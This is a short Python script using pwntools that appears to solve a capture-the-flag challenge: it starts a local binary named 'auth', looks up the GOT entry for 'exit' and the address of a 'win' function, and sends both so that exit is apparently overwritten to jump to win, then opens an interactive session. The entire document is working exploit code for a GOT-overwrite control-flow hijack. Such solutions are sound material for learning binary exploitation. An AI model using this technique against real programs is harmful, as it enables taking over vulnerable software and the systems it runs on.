from pwn import *

context.binary = './auth'

p = process()

print(hex(context.binary.got['exit']))
print(context.binary.functions['win'])
p.sendline(hex(context.binary.got['exit']).encode('ascii'))
p.sendline(hex(context.binary.functions['win'].address).encode('ascii'))
p.interactive()